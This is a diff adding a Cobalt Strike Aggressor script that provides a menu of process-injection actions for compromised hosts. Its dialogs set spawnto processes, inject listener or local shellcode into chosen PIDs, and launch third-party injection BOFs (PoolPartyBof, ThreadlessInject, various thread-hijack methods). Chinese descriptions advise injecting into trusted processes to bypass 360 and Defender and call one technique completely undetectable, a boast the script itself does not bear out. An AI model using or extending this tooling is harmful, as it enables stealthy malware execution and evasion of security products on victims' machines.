@@ -1,0 +1,109 @@
+menu "进程注入" {
+    item "spawnto" {
+    	$bid = $1['@'];
+    	$dialog = dialog("spawnto", %(process => "C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\csc.exe", bid => $bid), &spawnto);
+    	dialog_description($dialog, "使用内置命令spawnto设置基于Fork&Run命令创建的子进程，也可以在Profile配置文件中修改。");
+    	drow_text($dialog, "process", "process: ");
+        drow_combobox($dialog, "arch", "x64|x86: ", @("x64", "x86"));
+    	dbutton_action($dialog, "确定");
+    	dialog_show($dialog);
+	}
+    sub spawnto {
+        bspawnto($bid, "$3['arch']", "$3['process']");
+    }
+
+    item "inject-spawn" {
+    	$bid = $1['@'];
+    	$dialog = dialog("inject-spawn", %(process => "9176", bid => $bid), &inject-spawn);
+    	dialog_description($dialog, "使用内置命令inject注入shellcode到指定进程，而spawn是注入到spawnto设置的指定进程，tips: 注入可信白名单进程可绕过部分防护（如360、Defender等）。");
+        drow_listener($dialog, "listener", "listener: ");
+        drow_combobox($dialog, "options", "options: ", @("spawn","inject","shspawn","shinject"));
+    	drow_text($dialog, "process", "process: ");
+        drow_combobox($dialog, "arch", "x64|x86: ", @("x64", "x86"));
+    	dbutton_action($dialog, "确定");
+    	dialog_show($dialog);
+	}
+    sub inject-spawn {
+        if ($3['options'] eq "spawn") {
+            bspawn($bid, "$3['listener']", "$3['arch']");
+        }
+        if ($3['options'] eq "inject") {
+            binject($bid, "$3['process']", "$3['listener']", "$3['arch']");
+        }
+        if ($3['options'] eq "shspawn") {
+            # Read shellcode base64 from bin
+            if(2 == size(@_))
+            {
+                $shellfile = $1;
+            }
+            else
+            {
+                prompt_file_open("Select shellcode", $null, false, $this);
+                yield;
+                $shellfile = $1;
+            }
+            bshspawn($bid, "$3['arch']", $shellfile);
+        }
+        if ($3['options'] eq "shinject") {
+            # Read shellcode base64 from bin
+            if(2 == size(@_))
+            {
+                $shellfile = $1;
+            }
+            else
+            {
+                prompt_file_open("Select shellcode", $null, false, $this);
+                yield;
+                $shellfile = $1;
+            }
+            bshinject($bid, "$3['process']", "$3['arch']", $shellfile);
+        }
+    }
+
+    item "CS-Injections" {
+    	$bid = $1['@'];
+    	$dialog = dialog("CS-Injections", %(pid => "9176", bid => $bid), &Injections);
+    	dialog_description($dialog, "已集成多种注入方式，可以选择其中1种将本地shellcode文件注入到指定进程。");
+        drow_combobox($dialog, "method", "Method: ", @("createremotethread", "setthreadcontext", "ntcreatethread", "ntqueueapcthread", "kernelcallbacktable", "tooltip", "uxsubclassinfo", "clipboardinject", "conhost", "ctray", "dde", "svcctrl"));
+    	drow_text($dialog, "pid", "Process Pid: ");
+        drow_file($dialog, "shellcode", "Shellcode: ");
+    	dbutton_action($dialog, "确定");
+    	dialog_show($dialog);
+	}
+    sub Injections {
+        fireAlias($bid, "$3['method']", "$3['pid'] $3['shellcode']");
+        # https://github.com/trustedsec/CS-Remote-OPs-BOF/tree/main/Injection
+    }
+
+    item "PoolPartyBof" {
+    	$bid = $1['@'];
+    	$dialog = dialog("PoolPartyBof", %(pid => "9176", bid => $bid), &PoolPartyBof);
+    	dialog_description($dialog, "完全无法检测的滥用Windows线程池进程注入技术集合，BOF武器化支持5种技术/变体。");
+        drow_combobox($dialog, "variant", "variant: ", @("4", "5", "6", "7", "8"));
+    	drow_text($dialog, "pid", "Process Pid: ");
+        drow_file($dialog, "shellcode", "Shellcode: ");
+    	dbutton_action($dialog, "确定");
+    	dialog_show($dialog);
+    }
+    sub PoolPartyBof {
+        fireAlias($bid, "PoolPartyBof", "$3['pid'] $3['shellcode'] $3['variant']");
+        # https://github.com/0xEr3bus/PoolPartyBof
+    }
+
+    item "ThreadlessInject" {
+    	$bid = $1['@'];
+    	$dialog = dialog("ThreadlessInject", %(pid => "9176", dll => "ntdll.dll", bid => $bid), &ThreadlessInject);
+    	dialog_description($dialog, "ThreadlessInject是一种新颖的进程注入技术，涉及从远程进程挂钩导出函数以获得shellcode执行，NtTerminateProcess进程关闭时执行，NtOpenFile打开文件后执行。");
+        drow_combobox($dialog, "function", "Function: ", @("NtTerminateProcess", "NtOpenFile"));
+    	drow_text($dialog, "pid", "Process Pid: ");
+        drow_text($dialog, "dll", "Dll File: ");
+        drow_file($dialog, "shellcode", "Shellcode: ");
+    	dbutton_action($dialog, "确定");
+    	dialog_show($dialog);
+    }
+    sub ThreadlessInject {
+        fireAlias($bid, "threadless-inject", "$3['pid'] $3['dll'] $3['function'] $3['shellcode']");
+        # https://github.com/iilegacyyii/ThreadlessInject-BOF
+    }
+
+}
